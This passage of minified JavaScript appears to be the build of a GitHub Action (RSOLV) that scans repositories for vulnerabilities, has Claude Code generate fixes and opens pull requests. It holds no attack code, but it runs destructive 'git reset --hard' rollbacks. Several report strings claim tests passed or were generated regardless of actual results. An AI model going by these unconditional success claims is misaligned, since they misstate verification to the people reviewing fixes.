completed",{prUrl:o1.prUrl,vulnerabilitiesFixed:o1.vulnerabilitiesFixed,totalTimeMs:v1,totalTimeSec:Math.round(v1/1000)}),{success:!0,phase:"mitigate",message:`Fixed ${o1.vulnerabilitiesFixed} vulnerabilities and created PR`,data:{mitigation:o1,validationUsed:!0,executionTimeMs:v1}}}catch(Y){let W=Date.now()-J;return U.error("[MITIGATE] FAILED: Mitigation phase failed",{error:Y instanceof Error?Y.message:String(Y),stack:Y instanceof Error?Y.stack:void 0,totalTimeMs:W,totalTimeSec:Math.round(W/1000)}),{success:!1,phase:"mitigate",error:Y instanceof Error?Y.message:String(Y),data:{executionTimeMs:W,errorDetails:Y instanceof Error?Y.stack:String(Y)}}}}async executeAllPhases(X){try{U.info("Executing all phases: scan, validate, mitigate");let J=await this.executeScan(X);if(!J.success)return J;let Q=J.data?.scan?.createdIssues||[];if(U.info(`Scan created ${Q.length} issues (limited by max_issues: ${this.config.maxIssues})`),Q.length===0)return U.info("No issues created by scan, skipping validation and mitigation"),{success:!0,phase:"full",message:"No vulnerabilities found to process",data:{scan:J.data,validations:[],mitigations:[]}};let{getIssue:Y}=await Promise.resolve().then(() => (z9(),_8)),W=[];for(let Z of Q)try{U.info(`Fetching details for issue #${Z.number}`);let q=await Y(X.repository.owner,X.repository.name,Z.number);W.push(q)}catch(q){U.error(`Failed to fetch issue #${Z.number}:`,q)}if(W.length===0)return U.warn("Failed to fetch any issue details, cannot proceed"),{success:!1,phase:"full",error:"Failed to fetch issue details after scan"};U.info(`Validating ${W.length} issues`);let G=[],{ValidationMode:H}=await Promise.resolve().then(() => (FQ(),OQ)),z=this.validationMode||new H(this.config,process.cwd());for(let Z of W)try{U.info(`Validating issue #${Z.number}`);let q=await z.validateVulnerability(Z),B=this.getCurrentCommitSha();await this.storePhaseData("validation",{[`issue-${Z.number}`]:{issueNumber:q.issueId,validated:q.validated,falsePositiveReason:q.falsePositiveReason,branchName:q.branchName,redTests:q.redTests,testResults:q.testResults,timestamp:q.timestamp,commitHash:q.commitHash,hasSpecificVulnerabilities:q.validated,vulnerabilities:Z.specificVulnerabilities||[],confidence:"high"}},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:Z.number,commitSha:B});let M={success:!0,phase:"validate",data:{validation:q}};G.push({issue:Z,result:M})}catch(q){U.error(`Validation failed for issue #${Z.number}:`,q),G.push({issue:Z,result:{success:!1,phase:"validate",error:q instanceof Error?q.message:String(q)}})}let $=G.filter((Z)=>Z.result.success&&Z.result.data?.validation?.validated);U.info(`${$.length} of ${W.length} issues validated`);let V=[];for(let Z of G)if(Z.result.success&&Z.result.data?.validation?.validated)try{U.info(`Mitigating issue #${Z.issue.number}`);let q=await this.executeMitigate({...X,issueNumber:Z.issue.number});V.push(q)}catch(q){U.error(`Mitigation failed for issue #${Z.issue.number}:`,q),V.push({success:!1,phase:"mitigate",error:q instanceof Error?q.message:String(q)})}let K=V.filter((Z)=>Z.success).length;return{success:!0,phase:"full",message:`Completed all phases: ${Q.length} issues processed, ${$.length} validated, ${K} mitigated`,data:{scan:J.data,validations:G.map((Z)=>Z.result),mitigations:V}}}catch(J){return U.error("Full execution failed",J),{success:!1,phase:"full",error:J instanceof Error?J.message:String(J)}}}async storePhaseData(X,J,Q){let Y={};if(X==="scan")Y.scan={vulnerabilities:J.vulnerabilities||[],timestamp:new Date().toISOString(),commitHash:Q.commitSha};else if(X==="validation")Y.validation=J;else if(X==="mitigation")Y.mitigation=J;await this.phaseDataClient.storePhaseResults(X==="validation"?"validate":X==="mitigation"?"mitigate":X,Y,Q)}async retrievePhaseData(X,J,Q){return this.phaseDataClient.retrievePhaseResults(X,J,Q)}getCurrentCommitSha(){return AJ("git rev-parse HEAD",{encoding:"utf-8"}).trim()}async executeScanForIssue(X){try{U.info(`[SCAN] Analyzing issue #${X.number}`);let J=this.checkGitStatus();if(!J.clean)return{success:!1,phase:"scan",message:"Repository has uncommitted changes",error:`Uncommitted changes in: ${J.modifiedFiles.join(", ")}`};let Q=await Z6(X,this.config);if(!Q)return{success:!1,phase:"scan",message:"Failed to analyze issue",error:"Analysis returned no data"};let Y={vulnerabilities:[],timestamp:new Date().toISOString(),commitHash:this.getCurrentCommitSha(),canBeFixed:Q.canBeFixed||!1,analysisData:Q,gitStatus:J},W=this.getCurrentCommitSha();return await this.phaseDataClient.storePhaseResults("scan",{scan:Y},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:W}),{success:!0,phase:"scan",message:Q.canBeFixed?"Issue can be automatically fixed":"Issue cannot be automatically fixed",data:Y}}catch(J){return U.error("[SCAN] Failed to analyze issue",J),{success:!1,phase:"scan",error:J instanceof Error?J.message:String(J)}}}async executeValidateForIssue(X,J){try{U.info(`[VALIDATE] Generating tests for issue #${X.number}`);let{analysisData:Q}=J;if(!Q.canBeFixed)return{success:!1,phase:"validate",message:"Issue cannot be fixed, skipping validation"};let Y;if(this.testGeneratingAnalyzer){let $=new Map;if(Q.filesToModify&&Q.filesToModify.length>0){let V=(await import("fs")).default,K=(await import("path")).default;for(let Z of Q.filesToModify)try{let q=K.resolve(process.cwd(),Z);if(V.existsSync(q)){let B=V.readFileSync(q,"utf8");$.set(Z,B)}}catch(q){U.warn(`Could not read file ${Z} for test generation:`,q)}}Y=await this.testGeneratingAnalyzer.analyzeWithTestGeneration(X,this.config,$)}else if(this.config.testGeneration?.enabled||this.config.fixValidation?.enabled!==!1){let $={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials},V=new h6($),K=new Map;if(Q.filesToModify&&Q.filesToModify.length>0){let Z=(await import("fs")).default,q=(await import("path")).default;for(let B of Q.filesToModify)try{let M=q.resolve(process.cwd(),B);if(Z.existsSync(M)){let O=Z.readFileSync(M,"utf8");K.set(B,O)}}catch(M){U.warn(`Could not read file ${B}:`,M)}}Y=await V.analyzeWithTestGeneration(X,this.config,K)}let W=X.number,G;if(Y?.generatedTests?.success&&Y.generatedTests.tests?.[0]){let $=new BG,V=Y.generatedTests.tests[0],K=V.suggestedFileName||"__tests__/security/vulnerability-test.js";try{G=await $.runTests({framework:V.framework,testFile:K,workingDir:process.cwd(),timeout:30000}),U.info(`[VALIDATE] Test execution result: ${G.passed?"PASSED":"FAILED"}`)}catch(Z){U.warn("[VALIDATE] Could not execute test:",Z)}}let H={[W]:{validated:Y?.generatedTests?.success||!1,redTests:Y?.generatedTests?.testSuite,testResults:G,falsePositiveReason:void 0,timestamp:new Date().toISOString()}},z=this.getCurrentCommitSha();return await this.phaseDataClient.storePhaseResults("validate",{validate:H},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:z}),{success:!0,phase:"validate",message:H[W]?.validated?"Tests generated successfully":"Test generation skipped or failed",data:{validation:H}}}catch(Q){return U.error("[VALIDATE] Failed to generate tests",Q),{success:!1,phase:"validate",error:Q instanceof Error?Q.message:String(Q)}}}async executeMitigateForIssue(X,J,Q){let Y=Date.now(),W=this.getCurrentCommitSha();try{U.info(`[MITIGATE] Applying fix for issue #${X.number}`);let{analysisData:G}=J,{generatedTests:H}=Q,z={provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.1,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials,claudeCodeConfig:{verboseLogging:!0,timeout:600000,executablePath:process.env.CLAUDE_CODE_PATH,useStructuredPhases:this.config.useStructuredPhases}},$;if(this.config.aiProvider.useVendedCredentials&&this.config.rsolvApiKey){process.env.RSOLV_API_KEY=this.config.rsolvApiKey,U.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:T}=await Promise.resolve().then(() => (sX(),YJ));$=await T.getInstance(this.config.rsolvApiKey),U.info("Using vended credentials singleton for Claude Code")}let V,K=0,Z=this.maxIterations||this.getMaxIterations(X),q=X,B=!1;while(K<Z){U.info(`[MITIGATE] Fix attempt ${K+1}/${Z}`),U.info("=== MITIGATION ADAPTER CREATION DEBUG ==="),U.info(`useVendedCredentials in aiConfig: ${z.useVendedCredentials}`),U.info(`this.config.aiProvider.useVendedCredentials: ${this.config.aiProvider.useVendedCredentials}`),U.info(`credentialManager exists: ${!!$}`),U.info("==========================================");let T=new ZJ(z,process.cwd(),$),b={summary:`${G.issueType} issue analysis`,complexity:G.estimatedComplexity==="simple"?"low":G.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[G.suggestedApproach||""],recommendedApproach:G.suggestedApproach||"",relatedFiles:G.filesToModify},h=K>0?{current:K+1,max:Z}:void 0;if(V=await T.generateSolutionWithGit(q,b,void 0,Q,void 0,h),!V.success)if(process.env.RSOLV_TESTING_MODE==="true"&&V.isTestMode&&V.validationFailed)U.info("[TEST MODE] Solution failed validation but proceeding to create PR for inspection");else return{success:!1,phase:"mitigate",message:V.message,error:V.error};U.info(`[MITIGATE DEBUG] DISABLE_FIX_VALIDATION env: ${process.env.DISABLE_FIX_VALIDATION}`),U.info(`[MITIGATE DEBUG] config.fixValidation?.enabled: ${this.config.fixValidation?.enabled}`),U.info(`[MITIGATE DEBUG] config.testGeneration?.validateFixes: ${this.config.testGeneration?.validateFixes}`);let L=this.config.fixValidation?.enabled===!1;if(U.info(`[MITIGATE DEBUG] skipValidation calculated as: ${L}`),L){U.info("[MITIGATE] \uD83D\uDCCB Skipping fix validation (DISABLE_FIX_VALIDATION=true)"),U.info("[MITIGATE] Fix will be applied without validation - proceeding to PR creation");break}else if((this.config.testGeneration?.validateFixes===!0||this.config.fixValidation?.enabled===!0)&&H?.success&&H.testSuite){U.info("[MITIGATE] Validating fix with tests...");let k=await(this.gitBasedValidator||new oX).validateFixWithTests(W,V.commitHash,H.testSuite);if(k.isValidFix){U.info("[MITIGATE] ✅ Fix validated successfully"),B=!0;break}if(U.info(`[MITIGATE] ❌ Fix validation failed, will retry (${K+1}/${Z} attempts so far)`),K+1>=Z){if(process.env.RSOLV_TESTING_MODE==="true"){U.warn(`[TEST MODE] Fix validation failed after ${Z} attempts, but creating PR anyway for inspection`),V.isTestMode=!0,V.validationFailed=!0,V.testModeNote=`Validation failed after ${Z} attempts: ${this.explainTestFailureFromResult(k)}`;break}return AJ(`git reset --hard ${W}`,{encoding:"utf-8"}),{success:!1,phase:"mitigate",message:`Fix validation failed after ${Z} attempts`,error:this.explainTestFailureFromResult(k)}}AJ(`git reset --hard ${W}`,{encoding:"utf-8"}),q=this.createEnhancedIssueWithTestFailure(X,k,Q,K+1,Z),K++;continue}else{U.info("[MITIGATE] No validation configured, proceeding to PR creation");break}}U.info(`[MITIGATE] Creating PR from commit ${V.commitHash?.substring(0,8)}`);let O=process.env.RSOLV_EDUCATIONAL_PR!=="false"?await VQ(X,V.commitHash,{...V.summary,vulnerabilityType:J.analysisData.vulnerabilityType||"security",severity:J.analysisData.severity||"medium",cwe:J.analysisData.cwe,isAiGenerated:J.analysisData.isAiGenerated},this.config,V.diffStats):await KQ(X,V.commitHash,V.summary,this.config,V.diffStats);if(!O.success){try{AJ("git reset --hard HEAD~1",{encoding:"utf-8"})}catch(T){U.warn("Failed to rollback commit",T)}return{success:!1,phase:"mitigate",message:O.message,error:O.error}}let R=Date.now()-Y;U.info(`[MITIGATE] Successfully created PR in ${R}ms`);let F={[X.number]:{fixed:V.success||!1,prUrl:O.pullRequestUrl,fixCommit:V.commitHash,timestamp:new Date().toISOString()}};return await this.phaseDataClient.storePhaseResults("mitigate",{mitigate:F},{repo:`${X.repository.owner}/${X.repository.name}`,issueNumber:X.number,commitSha:V.commitHash}),{success:!0,phase:"mitigate",message:`Created PR #${O.pullRequestNumber}`,data:F}}catch(G){U.error("[MITIGATE] Failed to apply fix",G);try{AJ(`git reset --hard ${W}`,{encoding:"utf-8"})}catch(H){U.warn("Failed to rollback after error",H)}return{success:!1,phase:"mitigate",error:G instanceof Error?G.message:String(G)}}}async executeThreePhaseForIssue(X){try{U.info(`[THREE-PHASE] Processing issue #${X.number} through all phases`);let J=await this.executeScanForIssue(X);if(!J.success)return{...J,phase:"three-phase"};if(!J.data?.canBeFixed)return{success:!1,phase:"three-phase",message:"Issue cannot be fixed automatically",data:{scan:J.data}};let Q=await this.executeValidateForIssue(X,J.data);if(!Q.success)return{...Q,phase:"three-phase",data:{scan:J.data,validation:Q.data}};let Y=await this.executeMitigateForIssue(X,J.data,Q.data);return{success:Y.success,phase:"three-phase",message:Y.success?`Successfully processed issue #${X.number} through all phases`:Y.message,data:{scan:J.data,validation:Q.data,mitigation:Y.data},error:Y.error}}catch(J){return U.error("[THREE-PHASE] Failed to process issue",J),{success:!1,phase:"three-phase",error:J instanceof Error?J.message:String(J)}}}checkGitStatus(){try{let X=AJ("git status --porcelain",{encoding:"utf-8"}).trim();if(!X)return{clean:!0,modifiedFiles:[]};return{clean:!1,modifiedFiles:X.split(`
`).map((Q)=>Q.substring(3).trim()).filter((Q)=>Q.length>0)}}catch(X){return U.error("Failed to check git status",X),{clean:!1,modifiedFiles:["unknown"]}}}getMaxIterations(X){let J=X.labels.find((Q)=>Q.startsWith("fix-validation-max-"));if(J){let Q=parseInt(J.replace("fix-validation-max-",""));if(!isNaN(Q))return Q}if(this.config.fixValidation?.maxIterations!==void 0)return this.config.fixValidation.maxIterations;return 3}explainTestFailureFromResult(X){let J=[];if(!X.fixedCommit.allPassed){if(J.push("- **The vulnerability still exists** - RED tests are still failing on your fixed code"),X.fixedCommit.redTestsPassed.length>1){let Q=X.fixedCommit.redTestsPassed.map((Y,W)=>!Y?`RED test ${W+1}`:null).filter(Boolean);if(Q.length>0)J.push(`  Failed tests: ${Q.join(", ")}`)}}if(X.vulnerableCommit.allPassed)J.push("- **Warning**: RED tests passed on vulnerable code (they should have failed!)"),J.push("  This suggests the tests may not be properly detecting the vulnerability");return J.join(`
`)}explainTestFailure(X){let J=[];if(!X.validated)J.push("- Validation failed");if(X.falsePositiveReason)J.push(`- False positive: ${X.falsePositiveReason}`);if(X.testResults&&!X.testResults.success)J.push("- Test execution failed");return J.length>0?J.join(`
`):"Unknown validation failure"}createEnhancedIssueWithTestFailure(X,J,Q,Y,W){let G=Q.generatedTests?.tests?.[0]?.testCode||"",H=Q.generatedTests?.tests?.[0]?.framework||"unknown";return{...X,body:`${X.body}

## Previous Fix Attempt Failed

The previous fix did not pass the generated security tests:

### Test Results:
- Red Test (vulnerability should be fixed): ${J.fixedCommit.redTestPassed?"✅ PASSED":"❌ FAILED"}
- Green Test (fix should work): ${J.fixedCommit.greenTestPassed?"✅ PASSED":"❌ FAILED"}
- Refactor Test (functionality maintained): ${J.fixedCommit.refactorTestPassed?"✅ PASSED":"❌ FAILED"}

### Generated Test Code:
\`\`\`${H}
${G}
\`\`\`

Please fix the vulnerability again, ensuring the fix passes all three tests.

### Why the Previous Fix Failed:
${this.explainTestFailure(J)}

This is attempt ${Y+1} of ${W}.`}}testGeneratingAnalyzer;gitBasedValidator;maxIterations;testRunner;testDiscovery;testIntegrator;githubClient;validationTimeout;async executeValidateStandalone(X){try{if(U.info(`[VALIDATE-STANDALONE] Processing ${X.issues?.length} issues`),!X.issues||X.issues.length===0)return{success:!1,phase:"validate",error:"No issues provided for validation"};let J=[];for(let W of X.issues)try{let G=null;if(X.usePriorScan)G=(await this.phaseDataClient.retrievePhaseResults(`${W.repository.owner}/${W.repository.name}`,W.number,this.getCurrentCommitSha()))?.scan;if(!G){let B=await Z6(W,this.config);G={analysisData:{...B,canBeFixed:B?.canBeFixed||!1},canBeFixed:B?.canBeFixed||!1,usedPriorScan:!1}}if(!("canBeFixed"in G?G.canBeFixed:!0)){U.info(`[VALIDATE] Skipping issue #${W.number} - cannot be automatically fixed`),J.push({issueNumber:W.number,validated:!1,canBeFixed:!1,reason:"Issue cannot be automatically fixed",usedPriorScan:"usedPriorScan"in G?G.usedPriorScan:!1,timestamp:new Date().toISOString()});continue}let{ValidationMode:z}=await Promise.resolve().then(() => (FQ(),OQ)),$=new z(this.config,process.cwd());U.info(`[VALIDATE-STANDALONE] Using ValidationMode for issue #${W.number}`);let V=await $.validateVulnerability(W),K=null;if(X.runTests&&this.testRunner&&V.redTests)try{K=await this.testRunner.runTests(V.redTests),U.info(`Test execution result: ${K.redTestPassed?"PASSED":"FAILED"}`)}catch(B){U.warn(`Test execution failed for issue #${W.number}:`,B)}let Z=null;if(this.testDiscovery){if(Z=await this.testDiscovery.findExistingTests(W.repository),Z.hasTests&&V.redTests){if(U.info(`Found existing test framework: ${Z.framework}`),X.integrateTests&&this.testIntegrator)try{let B=await this.testIntegrator.integrateTests(V.redTests,Z);U.info(`Test integration result: ${B.integrated}`)}catch(B){U.warn(`Test integration failed: ${B}`)}}}let q={issueNumber:W.number,validated:V.validated,branchName:V.branchName,redTests:V.redTests,testResults:V.testResults,falsePositive:!V.validated,falsePositiveReason:V.falsePositiveReason,existingTests:Z?.hasTests,testFramework:Z?.framework,usedPriorScan:"usedPriorScan"in G?G.usedPriorScan:!1,timestamp:V.timestamp,commitHash:V.commitHash,hasSpecificVulnerabilities:V.validated,vulnerabilities:[],confidence:V.validated?"high":"low"};if(await this.phaseDataClient.storePhaseResults("validate",{validate:{[W.number]:q}},{repo:`${W.repository.owner}/${W.repository.name}`,issueNumber:W.number,commitSha:this.getCurrentCommitSha()}),X.postComment&&this.githubClient){let B=this.formatValidationComment(W,q);await this.githubClient.createIssueComment(W.repository.owner,W.repository.name,W.number,B)}try{let{addLabels:B,removeLabel:M}=await Promise.resolve().then(() => (z9(),_8));if(q.validated){if(U.info(`[VALIDATE] Adding 'rsolv:validated' label to issue #${W.number}`),await B(W.repository.owner,W.repository.name,W.number,["rsolv:validated"]),W.labels&&W.labels.includes("rsolv:detected"))U.info(`[VALIDATE] Removing 'rsolv:detected' label from issue #${W.number}`),await M(W.repository.owner,W.repository.name,W.number,"rsolv:detected")}else if(q.falsePositive){if(U.info(`[VALIDATE] Adding 'rsolv:false-positive' label to issue #${W.number}`),await B(W.repository.owner,W.repository.name,W.number,["rsolv:false-positive"]),W.labels&&W.labels.includes("rsolv:detected"))U.info(`[VALIDATE] Removing 'rsolv:detected' label from issue #${W.number}`),await M(W.repository.owner,W.repository.name,W.number,"rsolv:detected")}}catch(B){U.warn(`[VALIDATE] Failed to update labels for issue #${W.number}:`,B)}J.push(q)}catch(G){U.error(`Failed to validate issue #${W.number}:`,G);let H=this.generateFallbackTests(W);J.push({issueNumber:W.number,testGenerationFailed:!0,fallbackTests:!0,generatedTests:H,error:G instanceof Error?G.message:String(G)})}let Q=null;if(X.format)Q=this.generateValidationReport(J,X.format);let Y=J.some((W)=>W.validated!==!1&&!W.testGenerationFailed&&W.canBeFixed!==!1);if(X.issues.length===1){let W=J[0];return{success:W.validated!==!1&&W.canBeFixed!==!1&&!W.testGenerationFailed,phase:"validate",message:W.canBeFixed===!1?"Issue cannot be automatically fixed":W.testGenerationFailed?"Test generation failed":`Validation completed for issue #${X.issues[0].number}`,data:{validation:W,report:Q},error:W.testGenerationFailed?W.error:void 0}}return{success:Y,phase:"validate",message:`Validated ${J.length} issues`,data:{validations:J,report:Q,annotations:X.format==="github-actions"?this.generateGitHubAnnotations(J):void 0}}}catch(J){return U.error("[VALIDATE-STANDALONE] Failed",J),{success:!1,phase:"validate",error:J instanceof Error?J.message:String(J)}}}async generateValidationTests(X,J){let{analysisData:Q}=J;if(this.testGeneratingAnalyzer||this.config.testGeneration?.enabled){let Y=this.testGeneratingAnalyzer||new h6({provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials}),W=await this.getCodebaseFiles(Q),H=(await Y.analyzeWithTestGeneration(X,this.config,W)).generatedTests;return{generatedTests:{success:H?.success??!0,...H,redTest:H?.tests?.[0]?.testCode||"should fail when vulnerability exists",greenTest:H?.tests?.[1]?.testCode||"should pass when vulnerability is fixed",refactorTest:H?.tests?.[2]?.testCode||"should maintain original functionality"},...J}}return{generatedTests:this.generateFallbackTests(X),...J}}async getCodebaseFiles(X){let J=new Map;if(X?.filesToModify&&X.filesToModify.length>0){let Q=(await import("fs")).default,Y=(await import("path")).default;for(let W of X.filesToModify)try{let G=Y.resolve(process.cwd(),W);if(Q.existsSync(G)){let H=Q.readFileSync(G,"utf8");J.set(W,H)}}catch(G){U.warn(`Could not read file ${W}:`,G)}}return J}generateFallbackTests(X){return{success:!1,redTest:`// RED Test: Should fail when ${X.title} exists`,greenTest:`// GREEN Test: Should pass when ${X.title} is fixed`,refactorTest:"// REFACTOR Test: Should maintain functionality after fix"}}formatValidationComment(X,J){return`## Validation Results

**Issue #${X.number}**: ${X.title}

### Test Generation
- ✅ RED test generated (proves vulnerability exists)
- ✅ GREEN test generated (validates fix)
- ✅ REFACTOR test generated (ensures functionality preserved)

${J.falsePositive?`### ⚠️ Possible False Positive
Tests pass on current code - vulnerability may not exist.`:""}

${J.testExecutionFailed?`### ⚠️ Test Execution Failed
Tests were generated but could not be executed automatically.`:""}

### Next Steps
${J.falsePositive?`1. Review the generated tests
2. Close issue if false positive confirmed`:`1. Review the generated tests
2. Run mitigation mode to apply fix
3. Tests will validate the fix automatically`}
`}generateValidationReport(X,J){switch(J){case"markdown":return this.generateMarkdownReport(X);case"json":return JSON.stringify({issues:X},null,2);case"github-actions":return this.generateGitHubActionsReport(X);default:return JSON.stringify(X)}}generateMarkdownReport(X){let J=`# Validation Report

`;for(let Q of X)J+=`## Issue #${Q.issueNumber}

`,J+=Q.falsePositive?`**Status**: ⚠️ Possible False Positive

`:`**Status**: ✅ Validated

`,J+=`### Generated Tests
`,J+=`- RED test: Generated
`,J+=`- GREEN test: Generated
`,J+=`- REFACTOR test: Generated

`;return J}generateGitHubActionsReport(X){return X.map((J)=>`::${J.falsePositive?"warning":"notice"} ::Issue #${J.issueNumber} validated`).join(`
`)}generateGitHubAnnotations(X){return X.map((J)=>`::warning file=unknown,line=1::Issue #${J.issueNumber} - ${J.falsePositive?"Possible false positive":"Validation complete"}`)}async executeMitigateStandalone(X){try{if(U.info(`[MITIGATE-STANDALONE] Starting mitigation for ${X.issues?.length||1} issues`),!X.issues||X.issues.length===0)if(X.repository&&X.issueNumber){let z=await this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,await this.getCurrentCommitSha());if(!z?.validation&&!z?.validate)return{success:!1,phase:"mitigate",error:"No validation data available for mitigation"};let $={id:`issue-${X.issueNumber}`,number:X.issueNumber,title:"Issue from prior validation",body:"",labels:[],assignees:[],repository:{...X.repository,fullName:`${X.repository.owner}/${X.repository.name}`,defaultBranch:X.repository.defaultBranch||"main"},source:"github",createdAt:new Date().toISOString(),updatedAt:new Date().toISOString(),metadata:{}};X.issues=[$],X.validationData=z}else return{success:!1,phase:"mitigate",error:"No issues provided for mitigation"};let J=X.validationData;if(!J&&X.usePriorValidation){J={validation:{}};for(let z of X.issues){let $=await this.phaseDataClient.retrievePhaseResults(z.repository.fullName,z.number,await this.getCurrentCommitSha());if($?.validation)Object.assign(J.validation,$.validation);else if($?.validate)Object.assign(J.validation,$.validate)}}if(!J||Object.keys(J.validation||{}).length===0)if(X.generateTestsIfMissing){U.info("[MITIGATE-STANDALONE] No validation data, generating tests...");let z=await this.executeValidateStandalone(X);if(!z.success)return{success:!1,phase:"mitigate",error:"Failed to generate validation tests"};J=z.data}else return{success:!1,phase:"mitigate",error:"No validation data provided or found"};if(!this.config.aiProvider)return{success:!1,phase:"mitigate",error:"AI provider not configured"};let Q={},Y=!0,W=!1;for(let z of X.issues){let $=z.number,V,K=J.validation||J.validate;if(K){if(K[$])V=K[$];else if(K[`issue-${z.number}`])V=K[`issue-${z.number}`];else if(K.issueNumber===z.number)V=K}if(!V){U.warn(`[MITIGATE-STANDALONE] No validation data for issue #${z.number}`),Q[$]={success:!1,error:"No validation data for this issue"},Y=!1;continue}try{let Z=this.mitigateIssue(z,V,X),q=X.timeout||1800000,B=await Promise.race([Z,new Promise((M,O)=>setTimeout(()=>O(Error("Mitigation timeout")),q))]);if(Q[$]=B,!B.success)Y=!1;else W=!0}catch(Z){U.error(`[MITIGATE-STANDALONE] Failed to mitigate issue #${z.number}:`,Z),Q[$]={success:!1,error:Z instanceof Error?Z.message:"Unknown error"},Y=!1}}let G,H;if(X.format==="markdown")G=this.generateMitigationMarkdownReport(Q);else if(X.format==="json")H={mitigations:Object.entries(Q).map(([z,$])=>({issue:z,...typeof $==="object"&&$!==null?$:{result:$}}))};return await this.phaseDataClient.storePhaseResults("mitigate",{mitigate:Q},{repo:X.issues[0].repository.fullName,issueNumber:X.issues.length===1?X.issues[0].number:void 0,commitSha:await this.getCurrentCommitSha()}),{success:Y,phase:"mitigate",message:!Y&&W?"Partial success":void 0,data:{mitigation:Q,testsGenerated:X.generateTestsIfMissing},report:G,jsonReport:H}}catch(J){return U.error("[MITIGATE-STANDALONE] Unexpected error:",J),{success:!1,phase:"mitigate",error:J instanceof Error?J.message:"Unknown error"}}}async mitigateIssue(X,J,Q){let{GitBasedClaudeCodeAdapter:Y}=await Promise.resolve().then(() => (zQ(),PA)),W=new Y(this.config),G=0,H=Q.maxRetries||3,z;while(G<H){G++;try{let $=await W.generateSolutionWithGit(X,{summary:"Security issue fix",complexity:"medium",estimatedTime:30,potentialFixes:["Apply security fix"],recommendedApproach:"Fix security vulnerability"},void 0,J.generatedTests);if(Q.runTests){let{runTests:V}=await Promise.resolve().then(() => (yD(),hD));if(!(await V(J.generatedTests?.tests||[])).passed){if(G<H){U.info(`[MITIGATE] Tests failed, retrying (attempt ${G}/${H})`);continue}throw Error("Tests failed after fix")}}if(Q.refactorStyle)U.info("[MITIGATE] Refactoring code to match codebase style");if(Q.createPR){let V=await this.createMitigationPR(X,$,J,Q);return{success:!0,issueNumber:X.number,prUrl:V.url,prCreated:!0,prType:Q.prType||"standard",testsPass:!0,refactored:Q.refactorStyle||!1,attempts:G}}return{success:!0,issueNumber:X.number,fixCommit:$.commitHash,testsPass:!0,refactored:Q.refactorStyle||!1,attempts:G}}catch($){if(z=$,$ instanceof Error&&$.message.includes("Test environment"))throw $;if(G>=H)break}}return{success:!1,issueNumber:X.number,error:z?.message||"Failed to mitigate",attempts:G}}async createMitigationPR(X,J,Q,Y){let{createPullRequest:W}=await Promise.resolve().then(() => (uD(),mD)),G=`## Security Fix for Issue #${X.number}

`;if(G+=`### ${X.title}

`,Y.includeBeforeAfter)G+="### Before\n```javascript\n// Vulnerable code\n```\n\n",G+="### After\n```javascript\n// Fixed code\n```\n\n";if(Y.prType==="educational")G+=`### Security Education

`,G+=`This vulnerability is a ${Q.analysisData?.issueType||"security"} issue.

`,G+=`Learn more about this type of vulnerability and how to prevent it.

`,G+=`### Test Results
`,G+=`✅ All security tests pass

`;return W({title:`Fix: ${X.title}`,body:G,head:`fix-${X.number}`,base:X.repository.defaultBranch})}generateMitigationMarkdownReport(X){let J=`## Mitigation Report

`;for(let[Q,Y]of Object.entries(X)){let W=Q.replace("issue-","");if(J+=`### Issue #${W}
`,Y.success){if(J+=`✅ Fixed
`,Y.prUrl)J+=`- PR: ${Y.prUrl}
`;if(Y.testsPass)J+=`- Tests: Passing
`}else J+=`❌ Failed: ${Y.error}
`;J+=`
`}return J}_setTestDependencies(X){if(process.env.RSOLV_TESTING_MODE!=="true")throw Error("_setTestDependencies can only be called in test environment");if(X.scanner)this.scanner=X.scanner;if(X.validationMode)this.validationMode=X.validationMode}}async function Ih1(){try{U.info("Starting RSOLV action v2.0 - Enhanced Logging Active"),U.info(`Build timestamp: ${new Date().toISOString()}`);let X=await tH();U.info("Configuration loaded successfully");let J=iz();if(U.info(`Execution mode: ${J} - ${rz(J)}`),J==="scan"||J==="validate"||J==="mitigate"||J==="full"){let Q=new aG(X),Y=process.env.GITHUB_REPOSITORY;if(!Y)throw Error("GITHUB_REPOSITORY environment variable not set");let[W,G]=Y.split("/"),H=await fJ(W,G),z=await Q.execute(J,{repository:{owner:W,name:G,defaultBranch:H.defaultBranch||"main"},issueNumber:process.env.RSOLV_ISSUE_NUMBER?parseInt(process.env.RSOLV_ISSUE_NUMBER):void 0});if(process.env.GITHUB_OUTPUT){let $=await import("fs"),V=process.env.GITHUB_OUTPUT;if(z.data)$.appendFileSync(V,`phase_results=${JSON.stringify(z)}
`);if(J==="scan"&&z.data){let K=z.data;if(K.createdIssues)$.appendFileSync(V,`created_issues=${JSON.stringify(K.createdIssues)}
`),$.appendFileSync(V,`issues_created=${K.createdIssues.length}
`);if(K.vulnerabilities)$.appendFileSync(V,`scan_results=${JSON.stringify(K.vulnerabilities)}
`),$.appendFileSync(V,`security_findings=${JSON.stringify(K.vulnerabilities)}
`)}}return{success:z.success,message:z.message||`${J} phase completed`}}throw Error(`Unsupported mode: ${J}. Supported modes: scan, validate, mitigate, full`)}catch(X){return U.error("Action failed",X),{success:!1,message:`RSOLV action failed: ${X instanceof Error?X.message:String(X)}`}}}Ih1().then((X)=>{if(X.success)process.exit(0);else process.exit(1)});
